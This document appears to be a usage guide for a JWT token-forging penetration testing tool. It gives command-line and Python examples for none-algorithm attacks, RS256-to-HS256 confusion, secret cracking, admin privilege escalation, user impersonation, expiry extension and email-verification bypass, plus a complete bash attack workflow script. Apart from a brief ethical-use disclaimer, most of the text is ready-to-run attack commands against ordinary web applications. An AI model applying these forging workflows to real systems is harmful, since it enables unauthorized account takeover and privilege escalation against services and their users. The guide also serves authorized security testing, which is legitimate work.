# JWT Token Forging Guide 🎭

## Overview

JWT Token Forging allows you to create and manipulate JWT tokens for security testing. This is essential for testing authorization vulnerabilities, privilege escalation, and other JWT-related security issues.

## ⚠️ **ETHICAL USE ONLY**

This tool is for:
- ✅ Testing your own applications
- ✅ Authorized penetration testing
- ✅ Security research in controlled environments
- ✅ Educational purposes

**NEVER use for:**
- ❌ Unauthorized access
- ❌ Attacking systems you don't own
- ❌ Illegal activities

---

## Forge Modes

### 1. None Algorithm Attack (`none`)

Exploits JWT libraries that don't properly validate the `none` algorithm.

```bash
# Basic none attack
python -m src.cli forge TOKEN -m none

# With claim modifications
python -m src.cli forge TOKEN -m none -c '{"role":"admin"}'
```

**How it works:**
- Changes `alg` header to `none`
- Removes signature
- Optionally modifies claims

### 2. Modify Claims (`modify`)

Modify JWT payload claims (privilege escalation).

```bash
# Modify single claim
python -m src.cli forge TOKEN -m modify -c '{"role":"admin"}'

# Multiple claims
python -m src.cli forge TOKEN -m modify -c '{"role":"admin","isAdmin":true,"permissions":["all"]}'

# With re-signing (if you know the secret)
python -m src.cli forge TOKEN -m modify -c '{"role":"admin"}' -s "secret-key"
```

### 3. Quick Escalation (`escalate`)

Pre-built privilege escalation scenarios.

```bash
# User to admin escalation
python -m src.cli forge TOKEN -m escalate --escalation-type user_to_admin -s "secret"

# Available escalation types:
# - user_to_admin: Escalate to admin role
# - elevate_permissions: Add full permissions
# - change_user_id: Impersonate another user (e.g., admin user ID)
# - extend_expiry: Set far future expiration
# - bypass_email_verification: Mark email as verified
```

### 4. Algorithm Confusion (`confusion`)

RS256 → HS256 confusion attack.

```bash
# Use public key as HMAC secret
python -m src.cli forge TOKEN -m confusion --public-key "$(cat public.pem)"
```

**How it works:**
- Changes algorithm from RS256 to HS256
- Uses public key as HMAC secret
- Exploits systems that don't properly verify algorithm

### 5. Custom Token (`custom`)

Create completely custom JWT.

```bash
# Custom header and payload
python -m src.cli forge -m custom \
  --header '{"alg":"HS256","typ":"JWT"}' \
  --payload '{"sub":"hacker","role":"superadmin","exp":9999999999}' \
  -s "secret"
```

---

## Real-World Attack Scenarios

### Scenario 1: Admin Privilege Escalation

**Target:** Web app with user/admin roles

```bash
# 1. Get your user token
TOKEN="eyJhbGciOiJ..."

# 2. Analyze current claims
python -m src.cli analyze "$TOKEN"

# 3. Try none algorithm (if app is vulnerable)
python -m src.cli forge "$TOKEN" -m none -c '{"role":"admin"}' -o admin_token.txt

# 4. If signed with weak secret, crack it first
python -m src.cli crack "$TOKEN" -w wordlist.txt

# 5. If cracked, re-sign with modifications
python -m src.cli forge "$TOKEN" -m modify \
  -c '{"role":"admin"}' \
  -s "found-secret" \
  -o admin_token.txt
```

### Scenario 2: User Impersonation

**Target:** Access another user's account

```bash
# Original token for user 1234
TOKEN="eyJhbGciOiJ..."

# Change to admin user (ID: 1)
python -m src.cli forge "$TOKEN" -m modify \
  -c '{"sub":"1","user_id":"1","uid":"1"}' \
  -s "secret" \
  -o impersonate_token.txt
```

### Scenario 3: Token Lifetime Extension

**Target:** Extend expired or short-lived token

```bash
# Extend expiration to year 2286
python -m src.cli forge "$TOKEN" -m escalate \
  --escalation-type extend_expiry \
  -s "secret"
```

### Scenario 4: Email Verification Bypass

**Target:** Apps that check email_verified claim

```bash
python -m src.cli forge "$TOKEN" -m modify \
  -c '{"email_verified":true,"verified":true}' \
  -s "secret"
```

---

## Common JWT Claims to Modify

### User Identity
```json
{
  "sub": "1",           // Subject (user ID)
  "user_id": "1",
  "uid": "1",
  "username": "admin",
  "email": "admin@example.com"
}
```

### Roles & Permissions
```json
{
  "role": "admin",
  "roles": ["admin", "superuser"],
  "isAdmin": true,
  "admin": true,
  "permissions": ["read", "write", "delete", "admin"],
  "scope": "full"
}
```

### Verification Status
```json
{
  "email_verified": true,
  "verified": true,
  "confirmed": true
}
```

### Timestamps
```json
{
  "iat": 1640000000,      // Issued at
  "exp": 9999999999,      // Expiration (far future)
  "nbf": 1640000000       // Not before
}
```

---

## Testing Checklist

### Step 1: Reconnaissance
```bash
# Analyze the token
python -m src.cli analyze "$TOKEN"

# Check for weak patterns
# - Look for symmetric algorithms (HS256/384/512)
# - Check expiration time
# - Identify interesting claims
```

### Step 2: None Algorithm Test
```bash
# Try none algorithm attack
python -m src.cli forge "$TOKEN" -m none -c '{"role":"admin"}'

# Test the forged token in the application
```

### Step 3: Secret Cracking (if needed)
```bash
# Try to crack the secret
python -m src.cli crack "$TOKEN" -w wordlist.txt

# If found, use it for forging
```

### Step 4: Forge & Test
```bash
# Forge with modifications
python -m src.cli forge "$TOKEN" -m modify \
  -c '{"role":"admin","permissions":["all"]}' \
  -s "cracked-secret"

# Test in application
```

---

## Tips & Best Practices

### 1. Always Test on Your Own Apps First
Practice on applications you control before testing on authorized targets.

### 2. Document Everything
Keep track of:
- Original token
- Modifications made
- Secrets discovered
- Test results

### 3. Combine with Other Attacks
- Crack weak secrets first
- Try multiple forge modes
- Test different claim combinations

### 4. Look for Common Weaknesses
- Apps that accept `none` algorithm
- Weak secrets (crack them!)
- Missing signature validation
- Trust client-supplied headers

### 5. Test Edge Cases
```bash
# Very long expiration
-c '{"exp":9999999999}'

# Multiple role claims
-c '{"role":"admin","roles":["admin"],"isAdmin":true}'

# Negative user ID
-c '{"sub":"-1"}'

# Special characters
-c '{"username":"admin\\'--"}'
```

---

## Example: Full Attack Workflow

```bash
#!/bin/bash
# JWT Security Test Script

TOKEN="your_jwt_token_here"

echo "=== JWT Security Testing ==="
echo ""

# 1. Analyze
echo "[*] Step 1: Analyzing token..."
python -m src.cli analyze "$TOKEN"
echo ""

# 2. Try none algorithm
echo "[*] Step 2: Testing none algorithm..."
python -m src.cli forge "$TOKEN" -m none \
  -c '{"role":"admin"}' \
  -o forged_none.txt
echo ""

# 3. Try to crack secret
echo "[*] Step 3: Attempting to crack secret..."
python -m src.cli crack "$TOKEN" -w wordlists/common.txt
# If found secret, store it in $SECRET variable

# 4. Forge with known secret (if cracked)
if [ ! -z "$SECRET" ]; then
  echo "[*] Step 4: Forging with known secret..."
  python -m src.cli forge "$TOKEN" -m escalate \
    --escalation-type user_to_admin \
    -s "$SECRET" \
    -o forged_admin.txt
fi

echo ""
echo "=== Testing Complete ==="
echo "Check forged_none.txt and forged_admin.txt"
```

---

## API Usage (Python)

```python
from src.forger import JWTForger

forger = JWTForger()

# None algorithm attack
result = forger.forge_none_algorithm(
    token,
    claim_modifications={"role": "admin"}
)

# Modify claims
result = forger.forge_modify_claims(
    token,
    {"role": "admin", "permissions": ["all"]},
    secret="known-secret"
)

# Quick escalation
escalations = forger.get_common_escalations()
result = forger.forge_modify_claims(
    token,
    escalations["user_to_admin"]["modifications"],
    secret="secret"
)

# Custom token
result = forger.forge_custom(
    header={"alg": "HS256", "typ": "JWT"},
    payload={"sub": "attacker", "role": "admin"},
    secret="secret"
)

if result.success:
    print(f"Forged token: {result.token}")
```

---

## Troubleshooting

### Token Not Accepted
- Check if signature is required (re-sign with `-s`)
- Verify algorithm matches server expectations
- Ensure claim formats are correct (string vs boolean vs int)

### Modifications Not Taking Effect
- Server might be validating claims elsewhere
- Try different claim combinations
- Check for JWT validation middleware

### Secret Unknown
- Try cracking with wordlists
- Look for leaked secrets in:
  - Config files
  - Environment variables
  - Git history
  - Documentation

---

## Next Steps

After forging tokens, test them in:
1. **Authentication endpoints** - Login, refresh
2. **Authorization checks** - Access control
3. **API endpoints** - Different resources
4. **Admin panels** - Privileged operations

Monitor for:
- ✅ Successful privilege escalation
- ⚠️ Error messages (information disclosure)
- 🔍 Logging (detection indicators)
